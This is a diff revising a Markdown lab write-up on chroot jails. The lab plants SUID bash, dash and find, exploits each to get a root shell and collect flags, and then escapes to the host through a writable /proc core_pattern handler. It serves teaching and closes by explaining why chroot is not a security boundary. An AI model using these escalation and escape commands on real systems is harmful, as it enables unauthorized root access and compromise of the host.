@@ -10,7 +10,7 @@
 
 # **1. Goal**
 
-The goal is to build a restricted enviroment where the user starts as an intentionally low-privilege user named, who is already locked inside a chroot jail. The mission is multifaceted and designed to mirror real-world privilege escalation cases where a developer or sysadmin misunderstands what the chroot function actually protects. The steps required to complete the lab are to first perform a thorough enumeration to discover the three planted SUID misconfigurations, then to exploit each of these misconfigurations to escalate privileges to the root user. Once root is achieved, the goal is to capture all the root-level flags, and finally to perform realistic chroot escape to break out of the jailed environment and into the real host filesystem.
+The goal is to build a restricted enviroment where the user starts as an intentionally low-privilege user, who is already locked inside a chroot jail. The enviroment is multifaceted and designed to mirror real-world privilege escalation cases where a developer or sysadmin misunderstands what the chroot function actually protects. The steps required to escape the jail are to first perform a thorough enumeration to discover the three planted SUID misconfigurations, then to exploit each of these misconfigurations to escalate privileges to the root user. Once root is achieved, the goal is to capture all the root-level flags, and finally to perform realistic chroot escape to break out of the jailed environment and into the real host filesystem.
 
 ---
 
@@ -53,7 +53,7 @@ sudo mount --bind /dev     /var/chroot/dev
 sudo mount --bind /dev/pts /var/chroot/dev/pts
 ```
 
-These mounts are necessary because programs inside the jail still expect kernel interfaces to be present, and without `/proc`, many common tools simply break. Furthermore, interactive shells fail without the `/dev/pts` mount for pseudo-terminals, and several utilities crash without `/sys`. However, while these mounts are necessary for functionality, they inherently make the jail semi-transparent and offer a path for an attacker who achieves root privileges *inside* the jail to pivot into the *real* host system.
+These mounts are necessary because programs inside the jail still expect kernel interfaces to be present, and without `/proc`, many common tools simply break. Furthermore, interactive shells fail without the `/dev/pts` mount for pseudo-terminals, and several utilities crash without `/sys`. However, while these mounts are necessary for functionality, they inherently make the jail semi-transparent and offer a path for an attacker who achieves root privileges inside the jail to pivot into the real host system.
 
 ---
 
@@ -64,7 +64,7 @@ The next step is to temporarily enter the newly created environment to perform t
 ```bash
 sudo chroot /var/chroot /bin/bash
 useradd -m prisoner
-passwd prisoner   # password used: 123
+passwd prisoner
 exit
 ```
 
@@ -72,11 +72,11 @@ At this stage, the `/var/chroot` directory is a nearly self-contained Linux envi
 
 ---
 
-# **3. Planting Chroot Academy’s Three SUID Vulnerabilities**
+# **3. Planting SUID Vulnerabilities**
 
-The core of the Chroot Academy challenge lies in the presence of three specific SUID binaries that represent common, yet catastrophic, misconfigurations. The real Academy environment contains SUID versions of `/bin/bash`, `/bin/dash`, and `/usr/bin/find`. SUID root versions of these particular programs are known to be extremely dangerous in almost any context.
+The presence of three specific SUID binaries represents common, yet catastrophic, misconfigurations. The environment contains SUID versions of `/bin/bash`, `/bin/dash`, and `/usr/bin/find`. SUID root versions of these particular programs are known to be extremely dangerous in almost any context.
 
-Still operating as root *inside the jail* before dropping privileges to the `prisoner` user, the SUID bit is set on these three binaries.
+Still operating as root inside the jail before dropping privileges to the `prisoner` user, the SUID bit is set on these three binaries.
 
 ```bash
 chmod u+s /bin/bash
@@ -84,11 +84,11 @@ chmod u+s /bin/dash
 chmod u+s /usr/bin/find
 ```
 
-As a result of this action, each of these tools will now run with the **effective permissions of the root user**, regardless of whether the execution is initiated by the low-privilege `prisoner` user, creating the clear path for privilege escalation.
+As a result of this action, each of these tools will now run with the effective permissions of the root user**, regardless of whether the execution is initiated by the low-privilege `prisoner` user, creating the clear path for privilege escalation.
 
 ---
 
-### **3.1 Create the flags used by the web challenge**
+### **3.1 Create the flags as proof of privilege escalation**
 
 To simulate the flag collection goals of the original web challenge, three flags are created in the jailed root user's home directory.
 
@@ -104,26 +104,18 @@ Each flag is designed to reside only inside the jail environment and requires a 
 
 ---
 
-# **4. Starting Position: Inside the Jail as Prisoner**
-
-The actual testing begins by entering the environment and switching to the low-privilege `prisoner` user, exactly mimicking the initial state of the web-based challenge.
+# **4. Starting Position: enter the Jail as Prisoner**
 
 ```bash
 sudo chroot /var/chroot su - prisoner
 # password: 123
 ```
 
-The tester is now in the starting position, behaving exactly like the web-based challenge’s simulated prisoner within the confined chroot environment.
-
-👉 **Insert Screenshot: Terminal showing user = prisoner + chroot prompt**
-
 ---
 
 # **5. Enumeration – Finding the Vulnerabilities**
 
 As in any security assessment, enumeration is a critical first step. The goal is to identify points of weakness that can lead to privilege escalation.
-
-### **5.1 Identify all SUID binaries**
 
 A standard technique for finding privilege escalation vectors is to search the entire filesystem for files that have the SUID bit set.
 
@@ -139,17 +131,11 @@ The output confirms the intentionally planted vulnerabilities:
 /usr/bin/find
 ```
 
-This output is identical to the one exposed by the original web version of the challenge. This matters significantly: these three files are not only owned by root but have the SUID bit set, which means the low-privilege `prisoner` user can execute them *as root*, a critically catastrophic misconfiguration.
-
-👉 **Insert Screenshot #1: Output of `find / -perm -u=s -type f`**
-
----
+These three files are not only owned by root but have the SUID bit set, which means the low-privilege `prisoner` user can execute them as root.
 
 # **6. Level 1 – Exploiting SUID /bin/bash**
 
 The presence of an SUID root version of `/bin/bash` essentially signifies an immediate and complete compromise of any system.
-
-### **6.1 Get a root shell**
 
 The exploit is trivial, requiring only the execution of the program with a specific flag.
 
@@ -157,7 +143,7 @@ The exploit is trivial, requiring only the execution of the program with a speci
 /bin/bash -p
 ```
 
-The `-p` flag instructs the bash interpreter not to drop privileges, ensuring that the effective User ID (UID) remains at the level of the file owner, which is root. Once inside the root shell, verification and flag collection can proceed.
+The `-p` flag instructs the bash interpreter not to drop privileges, ensuring that the effective User ID remains at the level of the file owner, which is root. Once inside the root shell, verification and flag collection can proceed.
 
 ```bash
 whoami         # root
@@ -169,8 +155,6 @@ The first flag is successfully retrieved:
 ```
 FLAG-SUID-BASH-2025
 ```
-
-👉 **Insert Screenshot #2: `/bin/bash -p` + `whoami` + first flag**
 
 ---
 
@@ -190,8 +174,6 @@ This results in the second root shell and the collection of the second flag:
 FLAG-SUID-DASH-2025
 ```
 
-👉 **Insert Screenshot #3: `/bin/dash -p` + second flag**
-
 This exploit again provides an instant root shell, illustrating a common misconfiguration found on real-world systems, especially misconfigured embedded devices.
 
 ---
@@ -199,8 +181,6 @@ This exploit again provides an instant root shell, illustrating a common misconf
 # **8. Level 3 – Exploiting SUID /usr/bin/find**
 
 While the `find` utility is benign by itself, when granted SUID root permissions, its `-exec` function is transformed into a powerful weapon for command execution under an elevated user context. This specific attack method is well-documented, often being referenced directly from community resources like GTFOBins.
-
-### **8.1 Pop a root shell using find**
 
 The exploitation involves instructing `find` to execute a shell using its elevated privileges.
 
@@ -210,23 +190,17 @@ whoami
 cat /root/flag_find.txt
 ```
 
-The third flag is collected, completing the challenge as designed for the web version:
+The third flag is collected:
 
 ```
 FLAG-SUID-FIND-2025
 ```
 
-👉 **Insert Screenshot #4: find -exec exploit + third flag**
-
-Since this is a local lab, the assessment can now progress past the initial challenge levels to a deeper, more realistic objective.
-
 ---
 
-# **9. Bonus: Fully Escaping the Chroot Jail into the Real Host**
+# **9. Fully Escaping the Chroot Jail into the Real Host**
 
-The common belief that `chroot` prevents an escape is often misguided. In practice, **the only defense protecting the host system is the attacker *not* being root inside the jail**. Now that root privileges have been definitively obtained inside the jail, the escape procedure can be executed.
-
-### **9.1 Add a realistic misconfiguration**
+The common belief that `chroot` prevents an escape is often misguided. In practice, the only defense protecting the host system is the attacker not being root inside the jail. Now that root privileges have been definitively obtained inside the jail, the escape procedure can be executed.
 
 To facilitate a modern, realistic escape technique, a permission misconfiguration must be introduced, which represents a common oversight in deployed environments.
 
@@ -236,9 +210,6 @@ chmod 777 /proc
 
 This change simulates sloppy permission management, allowing write access to files in the `/proc` filesystem which are normally much more restricted.
 
----
-
-### **9.2 Abuse core_pattern to escape**
 
 Returning to the `prisoner`'s context within the jail, a sequence of commands is used to exploit the writable `/proc/sys/kernel/core_pattern` file. This is a common and effective technique for breaking out of a chroot environment when it is configured to use bind mounts correctly.
 
@@ -251,7 +222,7 @@ printf '%s' '/tmp/c/sh' > /proc/sys/kernel/core_pattern
 kill -SEGV $$
 ```
 
-This process forces the kernel to execute the attacker's script as the core-dump handler. Critically, the core-dump handler is executed **outside the chroot context**. This results in an instant root shell on the real host operating system.
+This process forces the kernel to execute the attacker's script as the core-dump handler. Critically, the core-dump handler is executed outside the chroot context. This results in an instant root shell on the real host operating system.
 
 The escape is verified by checking the user, hostname, and an external file.
 
@@ -267,9 +238,6 @@ The expected output confirms the full escape:
 CONGRATULATIONS-YOU-FULLY-ESCAPED-CHROOT-2025
 ```
 
-👉 **Insert Screenshot #5: Real host shell + REAL_ESCAPE_FLAG**
-
-This successful escape is the ultimate proof that the jail was completely defeated, demonstrating that SUID misuse breaks the very limited boundary that `chroot` establishes.
 
 ---
 
@@ -286,13 +254,13 @@ This ensures the test environment does not interfere with the host system's norm
 
 ---
 
-# **11. What This Lab Demonstrates**
+# **11. What This Demo Demonstrates**
 
-The exercise conclusively demonstrates several key principles essential for understanding containers and environment isolation.
+The demo conclusively demonstrates several key principles essential for understanding containers and environment isolation.
 
 ### **11.1 Chroot is NOT a security boundary**
 
-This lab reaffirms that a chroot only restricts the *filesystem view* for a process and is not built to be a strong security boundary on its own. It does **not** block or even mitigate several common security threats, including SUID escalation, the abuse of Linux capabilities, interactions with kernel interfaces, access to device files, exploitation via open file descriptors, or the core dump exploits demonstrated here.
+This lab reaffirms that a chroot only restricts the filesystem view for a process and is not built to be a strong security boundary on its own. It does not block or even mitigate several common security threats, including SUID escalation, the abuse of Linux capabilities, interactions with kernel interfaces, access to device files, exploitation via open file descriptors, or the core dump exploits demonstrated here.
 
 ### **11.2 SUID binaries inside a jail = instant compromise**
 
